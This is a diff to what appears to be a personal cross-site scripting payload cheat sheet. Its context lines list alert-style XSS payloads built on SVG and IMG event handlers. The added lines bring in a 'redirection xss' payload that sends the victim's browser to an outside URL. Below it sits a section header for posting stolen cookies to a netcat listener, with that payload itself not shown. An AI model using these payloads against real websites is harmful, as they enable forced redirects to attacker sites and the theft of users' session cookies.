@@ -3,6 +3,11 @@ always try to inpuit " ' >
 <svg/onload=alert('2')>
 <IMG SRC= onmouseover="alert('3')">
 <IMG onmouseover="alert('4')">
+-----------------------------
+|      redirection xss       | 
+-----------------------------
+<svg/onload=window['location']['href']="http://google.com">
+
  =================================================
 |      XSS to post cookie with nc -lvnp 80        |
  =================================================
